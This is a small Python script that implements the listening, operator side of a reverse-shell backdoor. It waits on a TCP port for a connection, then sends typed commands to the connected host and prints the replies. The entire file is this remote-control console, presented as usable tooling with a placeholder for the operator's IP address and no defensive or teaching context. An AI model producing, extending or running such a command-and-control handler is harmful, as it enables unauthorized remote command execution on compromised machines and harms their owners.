import socket

class back:
    '''Create a Class..!'''

    def __init__(self, ip, ports):
        '''this is a function'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, ports))
        listener.listen(0)
        print("[+] Wating for incoming Connections")
        self.connected, addres = listener.accept()
        print("[+] Get a Connection" + str(addres))

    def  command(self,commd):
        '''Define a Function'''
        self.connected.send(commd)
        return self.connected.recv(1024)

    # def ero(self):


    def run(self):
        '''function number tow'''
        while True:
            user_command = input(">>")
            re_valu = self.command(user_command.encode())
            print(re_valu.decode())



listenr = back("enter your ip", 8080)
listenr.run()





